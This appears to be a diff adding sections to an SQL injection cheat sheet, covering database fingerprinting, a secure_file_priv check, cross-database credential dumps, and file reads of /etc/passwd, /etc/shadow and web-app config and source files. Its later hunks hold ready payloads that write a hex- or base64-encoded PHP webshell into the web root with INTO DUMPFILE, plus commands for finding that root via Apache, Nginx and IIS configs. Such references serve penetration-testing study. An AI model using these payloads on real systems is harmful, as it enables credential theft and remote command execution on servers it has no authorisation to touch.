@@ -78,6 +78,7 @@ String:    SELECT * FROM users WHERE name = '[INPUT]'
 | `version()` | PostgreSQL |
 | `SELECT banner FROM v$version` | Oracle |
 | `sqlite_version()` | SQLite |
+| `SELECT POW(1,1)` returns `1` | MySQL (numeric output only) |
 | `SLEEP(5)` works | MySQL |
 | `WAITFOR DELAY '0:0:5'` works | MSSQL |
 | `pg_sleep(5)` works | PostgreSQL |
@@ -633,6 +634,28 @@ LISTAGG(username || ':' || password, CHR(10)) WITHIN GROUP (ORDER BY username)
 
 ## 9. Reading & Writing Files
 
+### Pre-Check — secure_file_priv (MySQL)
+
+Before reading or writing files, check if `secure_file_priv` restricts you:
+
+```sql
+-- Check the variable (empty = unrestricted, NULL = no file ops, path = restricted to that dir)
+' UNION SELECT NULL,variable_name,variable_value,NULL FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
+```
+
+> **MariaDB** defaults to empty (unrestricted). **MySQL** defaults to `/var/lib/mysql-files` (restricted). Some configs set it to `NULL` (no read/write at all).
+
+### Cross-Database Access
+
+When you've found other databases via `INFORMATION_SCHEMA.SCHEMATA`, access their tables using the dot operator:
+
+```sql
+-- Syntax: database_name.table_name
+' UNION SELECT NULL,username,password,NULL FROM dev.credentials-- -
+
+-- You don't need to switch databases — just prefix the table
+```
+
 ### MySQL — Read Files
 
 ```sql
@@ -640,6 +663,11 @@ LISTAGG(username || ':' || password, CHR(10)) WITHIN GROUP (ORDER BY username)
 ' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--
 ' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL--
 ' UNION SELECT NULL,LOAD_FILE('/etc/shadow'),NULL--
+
+-- Read the web app's own source code (look for DB creds, more vulns)
+' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL--
+' UNION SELECT NULL,LOAD_FILE('/var/www/html/search.php'),NULL--
+-- Note: PHP source renders as HTML in browser — view source (Ctrl+U) to see the code
 
 -- Hex-encode path to bypass filters
 ' UNION SELECT NULL,LOAD_FILE(0x2f6574632f706173737764),NULL--
@@ -661,7 +689,29 @@ LISTAGG(username || ':' || password, CHR(10)) WITHIN GROUP (ORDER BY username)
 
 -- DUMPFILE (binary-safe, single row)
 ' UNION SELECT NULL,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e INTO DUMPFILE '/var/www/html/shell.php'--
+
+-- FROM_BASE64 for writing long/binary files
+' UNION SELECT NULL,FROM_BASE64("base64_encoded_data_here") INTO DUMPFILE '/var/www/html/shell.php'--
 ```
+
+### Finding the Web Root
+
+You need the web root path before writing a webshell. Read the server config to find it:
+
+```sql
+-- Apache
+' UNION SELECT NULL,LOAD_FILE('/etc/apache2/apache2.conf'),NULL--
+' UNION SELECT NULL,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),NULL--
+
+-- Nginx
+' UNION SELECT NULL,LOAD_FILE('/etc/nginx/nginx.conf'),NULL--
+' UNION SELECT NULL,LOAD_FILE('/etc/nginx/sites-enabled/default'),NULL--
+
+-- IIS (Windows)
+' UNION SELECT NULL,LOAD_FILE('C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config'),NULL--
+```
+
+> **Default web roots:** Apache/Nginx → `/var/www/html`, IIS → `C:\inetpub\wwwroot`. If you can't read configs, try writing to common defaults or use error pages to leak the path.
 
 ### MSSQL — Read Files
 
